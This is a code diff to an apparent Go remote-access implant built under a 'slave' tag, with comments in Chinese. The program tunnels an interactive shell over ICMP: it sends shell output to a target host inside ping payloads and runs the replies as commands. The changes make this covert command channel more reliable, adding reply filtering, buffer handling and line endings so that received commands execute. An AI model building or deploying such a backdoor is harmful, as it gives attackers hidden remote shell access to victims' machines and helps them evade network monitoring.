@@ -1,3 +1,6 @@
+//go:build slave
+// +build slave
+
 package main
 
 import (
@@ -92,8 +95,11 @@ func createShell() (stdin io.WriteCloser, stdout io.ReadCloser, err error) {
 	return stdin, stdout, nil
 }
 
-func startPipeReader(outReader io.ReadCloser, outChan chan []byte) {
-	buf := make([]byte, DefaultMaxDataSize)
+func startPipeReader(outReader io.ReadCloser, outChan chan []byte, bufSize int) {
+	if bufSize <= 0 {
+		bufSize = DefaultMaxDataSize
+	}
+	buf := make([]byte, bufSize)
 	for {
 		n, err := outReader.Read(buf)
 		if err != nil {
@@ -101,7 +107,10 @@ func startPipeReader(outReader io.ReadCloser, outChan chan []byte) {
 			return
 		}
 		if n > 0 {
-			outChan <- buf[:n]
+			// 复制一份数据，避免下次 Read 覆盖底层数组导致 main goroutine 读到脏数据
+			data := make([]byte, n)
+			copy(data, buf[:n])
+			outChan <- data
 		}
 	}
 }
@@ -181,6 +190,9 @@ func getNextHopMAC(srcIP, dstIP net.IP) (net.HardwareAddr, error) {
 
 func sendICMP(dstIP string, data []byte) ([]byte, error) {
 	dst := net.ParseIP(dstIP)
+	if dst == nil {
+		return nil, fmt.Errorf("invalid destination ip: %s", dstIP)
+	}
 
 	// 获取源 IP：向目标IP的80端口发起UDP连接（仅用于获取本机出口IP，不会真正发送数据）
 	conn, err := net.Dial("udp", dstIP+":80")
@@ -202,6 +214,9 @@ func sendICMP(dstIP string, data []byte) ([]byte, error) {
 			}
 		}
 	}
+	if len(srcMAC) == 0 {
+		return nil, fmt.Errorf("无法找到源 IP %s 对应的 MAC 地址", srcIP)
+	}
 	// 2. 自动获取下一跳(网关或目标)的 MAC 地址 (DstMAC)
 	dstMAC, err := getNextHopMAC(srcIP, dst)
 	if err != nil {
@@ -218,7 +233,10 @@ func sendICMP(dstIP string, data []byte) ([]byte, error) {
 			}
 		}
 	}
-	handle, err := pcap.OpenLive(device, 65536, true, pcap.BlockForever)
+	if device == "" {
+		return nil, fmt.Errorf("无法找到源 IP %s 对应的抓包设备", srcIP)
+	}
+	handle, err := pcap.OpenLive(device, 65536, true, 100*time.Millisecond)
 	if err != nil {
 		return nil, fmt.Errorf("打开网卡失败: %v", err)
 	}
@@ -244,25 +262,30 @@ func sendICMP(dstIP string, data []byte) ([]byte, error) {
 	buffer := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
 	payload := gopacket.Payload(data)
-	gopacket.SerializeLayers(buffer, opts, eth, ip, icmp, payload)
+	if err := gopacket.SerializeLayers(buffer, opts, eth, ip, icmp, payload); err != nil {
+		return nil, fmt.Errorf("序列化 ICMP 包失败: %v", err)
+	}
 	if err := handle.WritePacketData(buffer.Bytes()); err != nil {
 		return nil, fmt.Errorf("发送ICMP包失败: %v", err)
 	}
 
 	// 开始计时，等待接收回包
 	start := time.Now()
+
+	// 设置 BPF 过滤规则：仅接收目标 IP 的 ICMP Echo Reply (type 0)
+	filter := fmt.Sprintf("icmp and host %s and icmp[0] == 0", dstIP)
+	if err := handle.SetBPFFilter(filter); err != nil {
+		return nil, fmt.Errorf("设置BPF过滤器失败: %v", err)
+	}
+
 	for {
 		// 检查总耗时是否超过了设定的 Timeout
 		if time.Since(start) > time.Duration(timeout)*time.Millisecond {
 			return nil, fmt.Errorf("timeout")
 		}
-		// 从网卡读取下一个抓到的包
+		// 从网卡读取下一个抓到的包（BPF已过滤，只收到目标IP的ICMP Echo Reply）
 		data, _, err := handle.ReadPacketData()
 		if err != nil {
-			// 如果是底层网卡抓取超时，继续循环检查总超时
-			if err == pcap.NextErrorTimeoutExpired || err.Error() == "Timeout Expired" {
-				continue
-			}
 			continue
 		}
 		// 4. 解析收到的包
@@ -292,7 +315,7 @@ func main() {
 
 	outChan := make(chan []byte, 100)
 
-	go startPipeReader(stdout, outChan)
+	go startPipeReader(stdout, outChan, maxDataSize)
 	for {
 		//从cmd读取输出
 		var outBuf []byte
@@ -302,14 +325,19 @@ func main() {
 		default:
 			outBuf = nil
 		}
-		fmt.Println(string(outBuf))
+		// 只在有数据时才打印，避免 nil 转 string 产生乱码
+		if outBuf != nil {
+			fmt.Println(string(outBuf))
+		}
 
 		replyData, err := sendICMP(target, outBuf)
 		if err != nil {
 			fmt.Println("sendICMP error:", err)
-		} else {
+		} else if len(replyData) > 0 {
 			fmt.Printf("%s\n", hex.Dump(replyData))
+			fmt.Println("------", string(replyData))
 			stdin.Write(replyData)
+			stdin.Write([]byte("\r\n"))
 		}
 
 		time.Sleep(time.Duration(delay) * time.Millisecond)
